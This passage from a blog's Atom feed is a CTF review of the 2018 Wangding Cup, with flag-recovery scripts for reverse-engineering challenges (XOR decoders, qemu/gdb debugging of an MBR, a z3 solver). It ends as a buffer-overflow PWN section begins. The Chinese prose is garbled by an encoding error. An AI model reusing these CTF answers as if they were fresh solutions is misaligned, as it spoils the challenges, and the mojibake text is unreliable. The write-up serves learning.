target="_blank" rel="noopener">https://xz.aliyun.com/t/2897</a><br><a href="https://blog.csdn.net/qq_33438733/article/details/83044151" target="_blank" rel="noopener">https://blog.csdn.net/qq_33438733/article/details/83044151</a></p>]]></content>
    
    <summary type="html">
    
      &lt;p&gt;çœ‹ç€å¤§ä½¬ä»¬çš„wpå¤ç°ä¸€æ³¢ã€‚&lt;/p&gt;
    
    </summary>
    
    
      <category term="ctf" scheme="https://qianfei11.github.io/tags/ctf/"/>
    
      <category term="review" scheme="https://qianfei11.github.io/tags/review/"/>
    
  </entry>
  
  <entry>
    <title>2018-ç½‘é¼æ¯-review</title>
    <link href="https://qianfei11.github.io/2018/09/12/2018-%E7%BD%91%E9%BC%8E%E6%9D%AF-review/"/>
    <id>https://qianfei11.github.io/2018/09/12/2018-ç½‘é¼æ¯-review/</id>
    <published>2018-09-12T13:00:45.000Z</published>
    <updated>2019-02-18T13:16:15.272Z</updated>
    
    <content type="html"><![CDATA[<p>ç°é˜¶æ®µä¸»è¦ä¸€ç›´åœ¨åšé€†å‘ï¼Œçœ‹äº†å¥½å‡ é“é€†å‘çš„wpå¤ç°ä¸€ä¸‹ã€‚</p><a id="more"></a><h1 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h1><h2 id="beijing"><a href="#beijing" class="headerlink" title="beijing"></a>beijing</h2><p>ç®€å•çš„å¼‚æˆ–ï¼Œç›´æ¥å–åŸæ¥çš„æ•°æ®ï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> pair[<span class="number">28</span>] = &#123;</span><br><span class="line">   <span class="number">0x61</span>, <span class="number">0x4C</span>, <span class="number">0x67</span>, <span class="number">0x59</span>, <span class="number">0x69</span>, <span class="number">0x29</span>, <span class="number">0x6E</span>, <span class="number">0x42</span>, <span class="number">0x62</span>, <span class="number">0x0D</span>, <span class="number">0x65</span>, <span class="number">0x71</span>, <span class="number">0x66</span>, <span class="number">0x34</span>, <span class="number">0x6A</span>, <span class="number">0xC6</span>, <span class="number">0x6D</span>, <span class="number">0x8A</span>, <span class="number">0x6C</span>, <span class="number">0x7F</span>, <span class="number">0x7B</span>, <span class="number">0xAE</span>, <span class="number">0x7A</span>, <span class="number">0x92</span>, <span class="number">0x7D</span>, <span class="number">0xEC</span>, <span class="number">0x5F</span>, <span class="number">0x57</span></span><br><span class="line">&#125;;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> choice[<span class="number">22</span>] = &#123;</span><br><span class="line">       <span class="number">0x6</span>, <span class="number">0x9</span>, <span class="number">0x0</span>, <span class="number">0x1</span>, <span class="number">0xA</span>, <span class="number">0x0</span>, <span class="number">0x8</span>, <span class="number">0x0</span>, <span class="number">0xB</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0xD</span>, <span class="number">0x4</span>, <span class="number">0x5</span>, <span class="number">0x2</span>, <span class="number">0x7</span>, <span class="number">0x2</span>, <span class="number">0x3</span>, <span class="number">0x1</span>, <span class="number">0xC</span></span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">   <span class="keyword">char</span> tmp = <span class="number">0</span>;</span><br><span class="line">   <span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">22</span>; i++) &#123;</span><br><span class="line">       <span class="keyword">switch</span>(choice[i]) &#123;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">0</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">6</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">7</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">8</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">9</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">10</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">11</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">12</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">case</span> <span class="number">13</span>:</span><br><span class="line">               tmp = pair[<span class="number">2</span> * choice[i]];</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">           <span class="keyword">default</span>:</span><br><span class="line">               tmp = <span class="number">0</span>;</span><br><span class="line">               <span class="keyword">break</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="built_in">printf</span>(<span class="string">"%c"</span>, tmp);</span><br><span class="line">       fflush(<span class="built_in">stdout</span>);</span><br><span class="line">   &#125;</span><br><span class="line">   <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="advanced"><a href="#advanced" class="headerlink" title="advanced"></a>advanced</h2><p>éé¢„æœŸè§£ï¼Œå¯¹åŠ å¯†äº†çš„å­—ç¬¦ä¸²å°è¯•å¼‚æˆ–å°±æ‰¾åˆ°äº†è§„å¾‹ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">enc = <span class="string">'K@LKVHr[DXEsLsYI@\\AMYIr\\EIZQ'</span></span><br><span class="line">flag = <span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(enc)):</span><br><span class="line">    <span class="keyword">if</span> i &amp; <span class="number">1</span>:</span><br><span class="line">        flag += chr(ord(enc[i]) ^ <span class="number">0x2C</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        flag += chr(ord(enc[i]) ^ <span class="number">0x2D</span>)</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h2 id="blend"><a href="#blend" class="headerlink" title="blend"></a>blend</h2><p>å’Œä¹‹å‰çš„<a href="https://github.com/TechSecCTF/writeups/tree/master/CSAWQuals2017/realism" target="_blank" rel="noopener">ä¸€é“é¢˜</a>åŸºæœ¬ä¸€æ ·ã€‚fileä¸€ä¸‹æ˜¯MBRï¼Œå¯ä»¥ç”¨qemuè·‘ä¸€ä¸‹ã€‚</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-system-i386 -s -drive format=raw,file=./main.bin</span><br></pre></td></tr></table></figure><p>é€šè¿‡gdbè¿œç¨‹è¿æ¥qemuè¿›è¡ŒåŠ¨æ€è°ƒè¯•ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">[Desktop] gdb                                                         23:42:46 </span><br><span class="line">GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1</span><br><span class="line">Copyright (C) 2016 Free Software Foundation, Inc.</span><br><span class="line">License GPLv3+: GNU GPL version 3 or later &lt;http://gnu.org/licenses/gpl.html&gt;</span><br><span class="line">This is free software: you are free to change and redistribute it.</span><br><span class="line">There is NO WARRANTY, to the extent permitted by law.  Type &quot;show copying&quot;</span><br><span class="line">and &quot;show warranty&quot; for details.</span><br><span class="line">This GDB was configured as &quot;x86_64-linux-gnu&quot;.</span><br><span class="line">Type &quot;show configuration&quot; for configuration details.</span><br><span class="line">For bug reporting instructions, please see:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/bugs/&gt;.</span><br><span class="line">Find the GDB manual and other documentation resources online at:</span><br><span class="line">&lt;http://www.gnu.org/software/gdb/documentation/&gt;.</span><br><span class="line">For help, type &quot;help&quot;.</span><br><span class="line">Type &quot;apropos word&quot; to search for commands related to &quot;word&quot;.</span><br><span class="line">GEF for linux ready, type `gef&apos; to start, `gef config&apos; to configure</span><br><span class="line">65 commands loaded for GDB 7.11.1 using Python engine 3.5</span><br><span class="line">[*] 5 commands could not be loaded, run `gef missing` to know why.</span><br><span class="line">gefâ¤  set architecture i8086</span><br><span class="line">warning: A handler for the OS ABI &quot;GNU/Linux&quot; is not built into this configuration</span><br><span class="line">of GDB.  Attempting to continue with the default i8086 settings.</span><br><span class="line"></span><br><span class="line">The target architecture is assumed to be i8086</span><br><span class="line">gefâ¤  set disassembly-flavor intel</span><br><span class="line">gefâ¤  target remote:1234</span><br><span class="line">Remote debugging using :1234</span><br><span class="line">0x0000c073 in ?? ()</span><br><span class="line">[ Legend: Modified register | Code | Heap | Stack | String ]</span><br><span class="line">â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€[ registers ]â”€â”€â”€â”€</span><br><span class="line">[!] Command &apos;context&apos; failed to execute properly, reason: &apos;NoneType&apos; object has no attribute &apos;all_registers&apos;</span><br></pre></td></tr></table></figure><p>æˆ–è€…åœ¨idaä¸­é™æ€åˆ†æï¼Œä¸»è¦è¦äº†è§£ä¸€ä¸‹<a href="https://www.jianshu.com/p/64ef4d304e17" target="_blank" rel="noopener">sseæŒ‡ä»¤</a>ï¼š</p><table><thead><tr><th style="text-align:center">æŒ‡ä»¤</th><th style="text-align:center">ä½œç”¨</th></tr></thead><tbody><tr><td style="text-align:center"><code>MOVAPS</code></td><td style="text-align:center">æŠŠæºå­˜å‚¨å™¨å†…å®¹å€¼é€å…¥ç›®çš„å¯„å­˜å™¨ã€‚å½“æœ‰m128æ—¶, å†…å­˜åœ°å€å¿…é¡»æ˜¯16å­—èŠ‚å¯¹é½çš„ã€‚</td></tr><tr><td style="text-align:center"><code>PSHUFD</code></td><td style="text-align:center">æœ‰ä¸‰ä¸ªæ“ä½œæ•°ï¼Œä»å·¦å¾€å³ï¼Œç¬¬ä¸€ä¸ªæ“ä½œæ•°æ˜¯ç›®çš„æ“ä½œæ•°ä¿å­˜ç»“æœï¼Œç¬¬äºŒä¸ªæ“ä½œæ•°æ˜¯æºæ“ä½œæ•°ï¼Œç¬¬ä¸‰ä¸ªæ“ä½œæ•°æ˜¯ä¸€ä¸ª8ä½ç«‹å³æ•°ï¼ŒæŒ‡å®šä»¥æ€æ ·çš„é¡ºåºå°†æºæ“ä½œæ•°ä¸­æ•°æ®ä¿å­˜åˆ°ç›®çš„æ“ä½œæ•°ã€‚</td></tr><tr><td style="text-align:center"><code>ANDPS</code></td><td style="text-align:center">æŒ‰ä½ä¸</td></tr><tr><td style="text-align:center"><code>PSADBW</code></td><td style="text-align:center">ç»å¯¹å·®å€¼æ±‚å’Œ</td></tr></tbody></table><p>å…ˆæ˜¯åˆ¤æ–­å­—ç¬¦ä¸²é•¿åº¦æ˜¯å¦å¤§äº19ï¼š</p><p><img src="/pics/2018-ç½‘é¼æ¯-review/blend/1.png" alt="åˆ¤æ–­å­—ç¬¦ä¸²é•¿åº¦"></p><p>ç„¶ååœ¨å¾ªç¯ä¸­é€ä¸ªæ¯”è¾ƒï¼š</p><p><img src="/pics/2018-ç½‘é¼æ¯-review/blend/2.png" alt="å¾ªç¯check"></p><p>åœ¨å¾ªç¯ä¸­ï¼Œä¸»è¦æ˜¯<code>pshufd</code>æŒ‡ä»¤çš„æ“ä½œï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0xffffffffffffff00  0xffffffffffffff00</span><br><span class="line">0xffffffffffff00ff  0xffffffffffff00ff</span><br><span class="line">0xffffffffff00ffff  0xffffffffff00ffff</span><br><span class="line">0xffffffff00ffffff  0xffffffff00ffffff</span><br><span class="line">0xffffff00ffffffff  0xffffff00ffffffff</span><br><span class="line">0xffff00ffffffffff  0xffff00ffffffffff</span><br><span class="line">0xff00ffffffffffff  0xff00ffffffffffff</span><br><span class="line">0x00ffffffffffffff  0x00ffffffffffffff</span><br></pre></td></tr></table></figure><p>ç„¶åä¸å†…å­˜ä¸­çš„æ•°æ®ç›¸ä¸ï¼Œå†é€šè¿‡<code>psadbw</code>æŒ‡ä»¤è¿›è¡Œç»å¯¹å·®æ±‚å’Œã€‚</p><p>è¿˜æœ‰å¯¹é«˜ä½ä½çš„ä¸€ä¸ªä½ç½®äº¤æ¢ï¼š</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">seg000:009F                 mov     di, ds:1268h</span><br><span class="line">seg000:00A3                 shl     edi, 10h</span><br><span class="line">seg000:00A7                 mov     di, ds:1270h</span><br></pre></td></tr></table></figure><p>æœ€åç”¨z3çº¦æŸæ±‚è§£ï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> z3 <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">s = Solver()</span><br><span class="line">a = Int(<span class="string">'a'</span>) </span><br><span class="line">b = Int(<span class="string">'b'</span>) </span><br><span class="line">c = Int(<span class="string">'c'</span>) </span><br><span class="line">d = Int(<span class="string">'d'</span>) </span><br><span class="line">e = Int(<span class="string">'e'</span>) </span><br><span class="line">f = Int(<span class="string">'f'</span>) </span><br><span class="line">g = Int(<span class="string">'g'</span>) </span><br><span class="line">h = Int(<span class="string">'h'</span>) </span><br><span class="line">i = Int(<span class="string">'i'</span>) </span><br><span class="line">j = Int(<span class="string">'j'</span>) </span><br><span class="line">k = Int(<span class="string">'k'</span>) </span><br><span class="line">l = Int(<span class="string">'l'</span>) </span><br><span class="line">m = Int(<span class="string">'m'</span>) </span><br><span class="line">n = Int(<span class="string">'n'</span>) </span><br><span class="line">o = Int(<span class="string">'o'</span>) </span><br><span class="line">p = Int(<span class="string">'p'</span>)</span><br><span class="line"></span><br><span class="line">s.add(a &lt; <span class="number">127</span>)</span><br><span class="line">s.add(b &lt; <span class="number">127</span>)</span><br><span class="line">s.add(c &lt; <span class="number">127</span>)</span><br><span class="line">s.add(d &lt; <span class="number">127</span>)</span><br><span class="line">s.add(e &lt; <span class="number">127</span>)</span><br><span class="line">s.add(f &lt; <span class="number">127</span>)</span><br><span class="line">s.add(g &lt; <span class="number">127</span>)</span><br><span class="line">s.add(h &lt; <span class="number">127</span>)</span><br><span class="line">s.add(i &lt; <span class="number">127</span>)</span><br><span class="line">s.add(j &lt; <span class="number">127</span>)</span><br><span class="line">s.add(k &lt; <span class="number">127</span>)</span><br><span class="line">s.add(l &lt; <span class="number">127</span>)</span><br><span class="line">s.add(m &lt; <span class="number">127</span>)</span><br><span class="line">s.add(n &lt; <span class="number">127</span>)</span><br><span class="line">s.add(o &lt; <span class="number">127</span>)</span><br><span class="line">s.add(p &lt; <span class="number">127</span>)</span><br><span class="line"></span><br><span class="line">s.add(a &gt; <span class="number">32</span>)</span><br><span class="line">s.add(b &gt; <span class="number">32</span>)</span><br><span class="line">s.add(c &gt; <span class="number">32</span>)</span><br><span class="line">s.add(d &gt; <span class="number">32</span>)</span><br><span class="line">s.add(e &gt; <span class="number">32</span>)</span><br><span class="line">s.add(f &gt; <span class="number">32</span>)</span><br><span class="line">s.add(g &gt; <span class="number">32</span>)</span><br><span class="line">s.add(h &gt; <span class="number">32</span>)</span><br><span class="line">s.add(i &gt; <span class="number">32</span>)</span><br><span class="line">s.add(j &gt; <span class="number">32</span>)</span><br><span class="line">s.add(k &gt; <span class="number">32</span>)</span><br><span class="line">s.add(l &gt; <span class="number">32</span>)</span><br><span class="line">s.add(m &gt; <span class="number">32</span>)</span><br><span class="line">s.add(n &gt; <span class="number">32</span>)</span><br><span class="line">s.add(o &gt; <span class="number">32</span>)</span><br><span class="line">s.add(p &gt; <span class="number">32</span>)</span><br><span class="line"></span><br><span class="line">s.add(abs(d<span class="number">-0x22</span>)+abs(c<span class="number">-0xf</span>)+abs(b<span class="number">-0x2</span>)+abs(a<span class="number">-0xc8</span>)+abs(h<span class="number">-0x83</span>)+abs(g<span class="number">-0xfb</span>)+abs(f<span class="number">-0xe0</span>)+abs(<span class="number">0</span><span class="number">-0x83</span>)==<span class="number">0x304</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0xc0</span>)+abs(o<span class="number">-0x20</span>)+abs(n<span class="number">-0xf</span>)+abs(m<span class="number">-0x10</span>)+abs(l<span class="number">-0xcd</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x13</span>)+abs(<span class="number">0</span><span class="number">-0xb8</span>)==<span class="number">0x311</span>)</span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x3</span>)+abs(e<span class="number">-0x4</span>)==<span class="number">0x2cd</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x00</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(<span class="number">0</span><span class="number">-0x3</span>)+abs(i<span class="number">-0x11</span>)==<span class="number">0x2d9</span>)</span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xcd</span>)==<span class="number">0x2db</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xd9</span>)==<span class="number">0x2d4</span>)</span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xdb</span>)==<span class="number">0x2e2</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xd4</span>)==<span class="number">0x2c4</span>)</span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xe2</span>)==<span class="number">0x2e2</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xc4</span>)==<span class="number">0x2ce</span>)</span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xe2</span>)==<span class="number">0x2ed</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xce</span>)==<span class="number">0x2d8</span>)</span><br><span class="line">s.add(abs(d<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xed</span>)==<span class="number">0x2e8</span>)</span><br><span class="line">s.add(abs(p<span class="number">-0x0</span>)+abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xd8</span>)==<span class="number">0x2dc</span>)</span><br><span class="line">s.add(abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(c<span class="number">-0x0</span>)+abs(b<span class="number">-0x0</span>)+abs(a<span class="number">-0x0</span>)+abs(h<span class="number">-0x0</span>)+abs(g<span class="number">-0x0</span>)+abs(f<span class="number">-0x2</span>)+abs(e<span class="number">-0xe8</span>)==<span class="number">0x2f6</span>)</span><br><span class="line">s.add(abs(<span class="number">0</span><span class="number">-0x0</span>)+abs(o<span class="number">-0x0</span>)+abs(n<span class="number">-0x0</span>)+abs(m<span class="number">-0x0</span>)+abs(l<span class="number">-0x0</span>)+abs(k<span class="number">-0x00</span>)+abs(j<span class="number">-0x2</span>)+abs(i<span class="number">-0xdc</span>)==<span class="number">0x2dd</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> s.check()</span><br><span class="line">model = s.model()</span><br><span class="line">ans = [model[a],model[b],model[c],model[d],model[e],model[f],model[g],model[h], model[i],model[j],model[k],model[l],model[m],model[n],model[o],model[p],<span class="number">0</span>]</span><br><span class="line"><span class="keyword">print</span> ans</span><br><span class="line">flag = <span class="string">''</span>.join([chr(int(str(x))) <span class="keyword">for</span> x <span class="keyword">in</span> ans])</span><br><span class="line"><span class="keyword">print</span> flag</span><br></pre></td></tr></table></figure><h1 id="PWN"><a href="#PWN" class="headerlink" title="PWN"></a>PWN</h1><h2 id="GUESS"><a href="#GUESS" class="headerlink" title="GUESS"></a>GUESS</h2><p>æ¼æ´ç‚¹å¾ˆæ˜æ˜¾ï¼Œ<code>gets</code>å¤„å¯ä»¥æº¢å‡ºï¼š</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span 